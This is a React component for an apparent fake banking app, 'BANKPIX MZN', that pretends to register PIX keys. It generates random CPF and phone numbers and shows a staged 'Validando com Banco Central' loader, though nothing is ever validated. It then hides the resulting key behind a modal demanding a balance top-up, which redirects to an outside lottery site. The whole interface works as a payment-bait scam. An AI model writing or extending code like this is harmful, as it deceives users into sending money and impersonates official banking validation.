'use client'

import { useState } from 'react'
import { ArrowLeft, Key, CheckCircle, Copy, Smartphone, CreditCard, AlertTriangle, Lock, Mail, Hash, Eye, X } from 'lucide-react'
import { type PixKey } from '@/lib/store'

interface CreateKeyViewProps {
  userName: string
  onAddKey: (key: PixKey) => void
  onBack: () => void
}

function generateCPF(): string {
  const n1 = Math.floor(Math.random() * 900) + 100
  const n2 = Math.floor(Math.random() * 900) + 100
  const n3 = Math.floor(Math.random() * 900) + 100
  const d = Math.floor(Math.random() * 90) + 10
  return `${n1}.${n2}.${n3}-${d}`
}

function generatePhone(): string {
  const ddd = ['11', '19', '21', '31', '41', '51'][Math.floor(Math.random() * 6)]
  const num = Math.floor(Math.random() * 900000000) + 100000000
  return `(${ddd})${num.toString().slice(0, 5)}-${num.toString().slice(5)}`
}

function generateRandom(): string {
  const c = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789'
  let r = ''
  for (let i = 0; i < 32; i++) r += c[Math.floor(Math.random() * c.length)]
  return r
}

function maskCPF(v: string): string {
  const p = v.split('.')
  if (p.length === 3) return `${p[0]}.***.***-${p[2].split('-')[1]}`
  return v
}

function maskPhone(v: string): string {
  return v.length >= 14 ? `${v.slice(0, 5)}*****${v.slice(-4)}` : v
}

function maskRandom(v: string): string {
  return v.length >= 32 ? `${v.slice(0, 4)}************************${v.slice(-4)}` : v
}

export function CreateKeyView({ userName, onAddKey, onBack }: CreateKeyViewProps) {
  const [keyName, setKeyName] = useState('')
  const [keyType, setKeyType] = useState<'cpf' | 'celular' | 'aleatorio' | 'email'>('cpf')
  const [screen, setScreen] = useState<'form' | 'loading' | 'success' | 'email'>('form')
  const [msgIndex, setMsgIndex] = useState(0)
  const [result, setResult] = useState<{ name: string; type: string; raw: string; masked: string } | null>(null)
  const [copied, setCopied] = useState(false)
  const [showRecargaModal, setShowRecargaModal] = useState(false)

  const msgs = ['Gerando chave...', 'Conectando ao servidor...', 'Validando com Banco Central...', 'Registrando chave...', 'Finalizando...']

  const handleGenerate = async () => {
    if (!keyName.trim()) {
      alert('Digite um nome para sua chave')
      return
    }

    setMsgIndex(0)
    setScreen('loading')

    setTimeout(() => {
      let val = '', masked = ''
      
      if (keyType === 'cpf') {
        val = generateCPF()
        masked = maskCPF(val)
      } else if (keyType === 'celular') {
        val = generatePhone()
        masked = maskPhone(val)
      } else {
        val = generateRandom()
        masked = maskRandom(val)
      }

      const newKey: PixKey = {
        id: `key-${Date.now()}`,
        name: keyName.trim().toUpperCase(),
        type: keyType === 'email' ? 'cpf' : keyType,
        value: val,
        createdAt: new Date()
      }

      onAddKey(newKey)
      setResult({ name: keyName.trim().toUpperCase(), type: keyType, raw: val, masked })
      setScreen('success')
    }, 5000)
  }

  const handleCopy = () => {
    if (!result) return
    const label = result.type === 'cpf' ? 'CHAVE CPF' : result.type === 'celular' ? 'CHAVE CELULAR' : 'CHAVE ALEATORIA'
    
    const textToCopy = `${result.name}\n\n${label}:${result.raw}\n\nBANCO:BANKPIX MZN`
    
    navigator.clipboard.writeText(textToCopy)
    setCopied(true)
    setTimeout(() => setCopied(false), 2000)
  }

  const handleRecargaRedirect = () => {
    window.location.href = 'https://loteriasegredo.com/desbloquei-seu-app/'
  }

  // LOADING
  if (screen === 'loading') {
    return (
      <div className="min-h-screen flex items-center justify-center p-4 bg-background">
        <div className="text-center">
          <div className="relative mx-auto w-24 h-24 mb-8">
            <div className="absolute inset-0 border-4 border-primary/20 border-t-primary rounded-full animate-spin" />
            <div className="absolute inset-0 flex items-center justify-center">
              <Key className="w-10 h-10 text-primary" />
            </div>
          </div>
          <p className="text-xl font-bold text-foreground mb-2">{msgs[msgIndex]}</p>
          <p className="text-xs text-muted-foreground mt-4">Não feche o aplicativo</p>
        </div>
      </div>
    )
  }

  // SUCCESS
  if (screen === 'success' && result) {
    const label = result.type === 'cpf' ? 'CPF' : result.type === 'celular' ? 'CELULAR' : 'ALEATÓRIA'
    return (
      <div className="min-h-screen flex items-center justify-center p-4 bg-background relative">
        <div className="w-full max-w-md">
          <div className="text-center mb-8">
            <div className="w-20 h-20 mx-auto mb-5 rounded-full bg-green-500/10 flex items-center justify-center">
              <CheckCircle className="w-10 h-10 text-green-500" />
            </div>
            <h2 className="text-2xl font-bold text-foreground mb-1">Chave Criada com Sucesso!</h2>
            <p className="text-sm text-muted-foreground">Sua chave PIX foi registrada</p>
          </div>

          <div className="p-5 rounded-2xl bg-muted/50 border border-border mb-5 space-y-4">
            <div className="flex justify-between items-center pb-3 border-b border-border">
              <span className="text-sm text-muted-foreground">Tipo de Chave</span>
              <span className="font-semibold text-foreground">{label}</span>
            </div>
            <div className="flex justify-between items-center pb-3 border-b border-border">
              <span className="text-sm text-muted-foreground">Titular</span>
              <span className="font-semibold text-foreground">{result.name}</span>
            </div>
            <div className="flex justify-between items-center pb-3 border-b border-border">
              <span className="text-sm text-muted-foreground">Chave</span>
              <div className="flex items-center gap-1">
                <span className="font-mono text-sm text-foreground">
                  {result.masked}
                </span>
                {/* Botão do olho aumentado e com maior área de clique para celular */}
                <button 
                  type="button" 
                  onClick={() => setShowRecargaModal(true)} 
                  className="p-3 -mr-2 hover:bg-muted rounded-full text-primary transition-colors active:scale-95"
                  aria-label="Visualizar chave"
                >
                  <Eye className="w-6 h-6" />
                </button>
              </div>
            </div>
            <div className="flex justify-between items-center pb-3 border-b border-border">
              <span className="text-sm text-muted-foreground">Instituição</span>
              <span className="font-semibold text-primary">BANKPIX MZN</span>
            </div>
            <div className="flex justify-between items-center">
              <span className="text-sm text-muted-foreground">Status</span>
              <div className="flex items-center gap-1.5 px-3 py-1 rounded-full bg-red-500/10 border border-red-500/20">
                <div className="w-1.5 h-1.5 bg-red-500 rounded-full animate-pulse" />
                <span className="text-xs font-semibold text-red-500">INATIVO</span>
              </div>
            </div>
          </div>

          <button 
            onClick={handleCopy} 
            className="w-full py-4 rounded-xl bg-emerald-600 hover:bg-emerald-700 text-white font-semibold mb-6 flex items-center justify-center gap-2 shadow-lg shadow-emerald-600/20 transition-all active:scale-[0.98]"
          >
            <Copy className="w-4 h-4" />
            {copied ? 'Copiado com Sucesso!' : 'Copiar Dados da Chave'}
          </button>

          <button 
            onClick={onBack} 
            className="w-full py-3 rounded-xl border border-border text-muted-foreground font-medium flex items-center justify-center gap-2 hover:bg-muted/50 transition-colors"
          >
            <ArrowLeft className="w-4 h-4" />
            Voltar ao início
          </button>
        </div>

        {/* QUADRO DE AVISO ANIMADO NO MEIO DA TELA (MODAL) */}
        {showRecargaModal && (
          <div className="fixed inset-0 z-50 flex items-center justify-center p-4 bg-black/60 backdrop-blur-sm animate-in fade-in duration-200">
            <div className="bg-card border border-border w-full max-w-sm rounded-2xl p-6 shadow-2xl relative text-center animate-in zoom-in-95 duration-200">
              
              {/* Botão de fechar o quadro */}
              <button 
                onClick={() => setShowRecargaModal(false)}
                className="absolute top-4 right-4 p-1 rounded-lg text-muted-foreground hover:bg-muted transition-colors"
              >
                <X className="w-5 h-5" />
              </button>

              <div className="w-16 h-16 mx-auto mb-4 rounded-full bg-red-500/10 border border-red-500/20 flex items-center justify-center">
                <AlertTriangle className="w-8 h-8 text-red-500" />
              </div>

              <h3 className="text-xl font-bold text-foreground mb-2">
                Recarregue para ver sua chave!
              </h3>
              
              <p className="text-sm text-muted-foreground mb-6 leading-relaxed">
                Você ainda não efetuou nenhuma recarga na sua conta. É necessário saldo ativo para conseguir visualizar e desbloquear esta chave PIX.
              </p>

              <button 
                onClick={handleRecargaRedirect}
                className="w-full py-4 rounded-xl bg-primary text-primary-foreground font-bold flex items-center justify-center gap-2 shadow-lg shadow-primary/30 hover:bg-primary/90 transition-all active:scale-[0.98]"
              >
                Recarregar Agora
              </button>
            </div>
          </div>
        )}
      </div>
    )
  }

  // EMAIL WARNING
  if (screen === 'email') {
    return (
      <div className="min-h-screen flex items-center justify-center p-4 bg-background">
        <div className="w-full max-w-md text-center">
          <div className="w-20 h-20 mx-auto mb-5 rounded-full bg-yellow-500/10 flex items-center justify-center">
            <AlertTriangle className="w-10 h-10 text-yellow-500" />
          </div>
          <h2 className="text-2xl font-bold text-foreground mb-2">Chave Email Indisponível</h2>
          <p className="text-muted-foreground mb-8">Para cadastrar chave por Email, você precisa ativar sua conta primeiro.</p>
          
          <div className="p-5 rounded-2xl bg-yellow-500/10 border border-yellow-500/20 mb-6 text-left">
            <p className="text-sm font-medium text-foreground mb-3">Ative sua conta para desbloquear:</p>
            <ul className="space-y-2">
              <li className="flex items-center gap-3 text-sm text-muted-foreground">
                <Lock className="w-4 h-4 text-yellow-500" />
                Chave PIX por Email
              </li>
              <li className="flex items-center gap-3 text-sm text-muted-foreground">
                <Lock className="w-4 h-4 text-yellow-500" />
                Receber transferências
              </li>
              <li className="flex items-center gap-3 text-sm text-muted-foreground">
                <Lock className="w-4 h-4 text-yellow-500" />
                Saques via M-Pesa e e-Mola
              </li>
            </ul>
          </div>
          
          <button 
            onClick={() => { setScreen('form'); setKeyType('cpf') }} 
            className="w-full py-3 rounded-xl border border-border text-muted-foreground font-medium flex items-center justify-center gap-2 hover:bg-muted/50 transition-colors"
          >
            <ArrowLeft className="w-4 h-4" />
            Voltar e escolher outro tipo
          </button>
        </div>
      </div>
    )
  }

  // FORM
  return (
    <div className="min-h-screen p-4 pt-20 lg:pt-6 pb-20 bg-background">
      <div className="flex items-center gap-4 mb-8">
        <button 
          onClick={onBack} 
          className="p-2.5 rounded-xl bg-muted border border-border hover:bg-muted/80 transition-colors"
        >
          <ArrowLeft className="w-5 h-5" />
        </button>
        <div>
          <h1 className="text-2xl font-bold text-foreground">Cadastrar Chave PIX</h1>
          <p className="text-sm text-muted-foreground">Crie uma nova chave para receber pagamentos</p>
        </div>
      </div>

      <div className="max-w-md mx-auto space-y-6">
        <div>
          <label className="block text-sm font-medium text-foreground mb-2">Nome da Chave</label>
          <input
            type="text"
            value={keyName}
            onChange={e => setKeyName(e.target.value)}
            placeholder="Escolha qualquer nome para sua chave"
            className="w-full p-4 rounded-xl bg-muted border border-border text-foreground placeholder:text-muted-foreground focus:outline-none focus:ring-2 focus:ring-primary focus:border-transparent transition-all uppercase"
          />
          <p className="text-xs text-muted-foreground mt-2">Ex: MEU PIX PRINCIPAL, CONTA PESSOAL...</p>
        </div>

        <div>
          <label className="block text-sm font-medium text-foreground mb-3">Tipo de Chave</label>
          <div className="grid grid-cols-2 gap-3">
            {[
              { t: 'cpf', icon: CreditCard, label: 'CPF' },
              { t: 'celular', icon: Smartphone, label: 'Celular' },
              { t: 'aleatorio', icon: Hash, label: 'Aleatória' },
              { t: 'email', icon: Mail, label: 'Email', locked: true }
            ].map(({ t, icon: Icon, label, locked }) => (
              <button
                key={t}
                type="button"
                onClick={() => t === 'email' ? setScreen('email') : setKeyType(t as any)}
                className={`relative flex flex-col items-center gap-2 p-4 rounded-xl border-2 transition-all ${
                  keyType === t ? 'border-primary bg-primary/10' : 'border-border hover:border-primary/50'
                }`}
              >
                {locked && <Lock className="w-3 h-3 text-yellow-500 absolute top-2 right-2" />}
                <Icon className={`w-7 h-7 ${keyType === t ? 'text-primary' : 'text-muted-foreground'}`} />
                <span className={`text-sm font-medium ${keyType === t ? 'text-primary' : 'text-foreground'}`}>{label}</span>
              </button>
            ))}
          </div>
        </div>

        <div className="p-4 rounded-xl bg-muted/50 border border-border">
          <p className="text-xs text-muted-foreground mb-1">Formato da chave:</p>
          <p className="font-mono text-sm text-foreground">
            {keyType === 'cpf' && 'XXX.***.***-XX'}
            {keyType === 'celular' && '(XX)XXXXX-XXXX'}
            {keyType === 'aleatorio' && 'XXXX************************XXXX'}
            {keyType === 'email' && 'Requer ativação da conta'}
          </p>
        </div>

        <button
          type="button"
          onClick={handleGenerate}
          disabled={!keyName.trim()}
          className="w-full py-4 rounded-xl bg-primary text-primary-foreground font-semibold flex items-center justify-center gap-2 shadow-lg shadow-primary/20 disabled:opacity-50 disabled:cursor-not-allowed hover:bg-primary/90 transition-colors"
        >
          <Key className="w-5 h-5" />
          Gerar Chave PIX
        </button>

        <p className="text-xs text-center text-muted-foreground">
          Ao gerar a chave, ela será vinculada ao Banco Central do Brasil
        </p>
      </div>
    </div>
  )
}
